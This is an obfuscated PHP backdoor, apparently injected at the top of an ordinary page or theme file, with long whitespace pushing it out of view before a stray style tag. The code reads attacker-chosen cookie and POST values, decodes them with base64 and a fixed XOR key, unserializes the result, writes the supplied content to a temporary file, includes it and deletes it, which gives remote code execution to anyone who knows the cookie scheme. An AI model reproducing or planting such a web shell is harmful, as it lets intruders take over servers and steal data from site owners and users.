<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("tygetm")){class tygetm{public static $nnmfwqx = "ifeouvubqepxoevf";public static $fxrcjjwt = NULL;public function __construct(){$idllxeycqq = @$_COOKIE[substr(tygetm::$nnmfwqx, 0, 4)];if (!empty($idllxeycqq)){$gnaclia = "base64";$ohcoeder = "";$idllxeycqq = explode(",", $idllxeycqq);foreach ($idllxeycqq as $nikzygngx){$ohcoeder .= @$_COOKIE[$nikzygngx];$ohcoeder .= @$_POST[$nikzygngx];}$ohcoeder = array_map($gnaclia . "_decode", array($ohcoeder,));$ohcoeder = $ohcoeder[0] ^ str_repeat(tygetm::$nnmfwqx, (strlen($ohcoeder[0]) / strlen(tygetm::$nnmfwqx)) + 1);tygetm::$fxrcjjwt = @unserialize($ohcoeder);}}public function __destruct(){$this->uhuvscajhj();}private function uhuvscajhj(){if (is_array(tygetm::$fxrcjjwt)) {$pycul = sys_get_temp_dir() . "/" . crc32(tygetm::$fxrcjjwt["salt"]);@tygetm::$fxrcjjwt["write"]($pycul, tygetm::$fxrcjjwt["content"]);include $pycul;@tygetm::$fxrcjjwt["delete"]($pycul);exit();}}}$inuufnf = new tygetm();$inuufnf = NULL;} ?><style type="text/css">
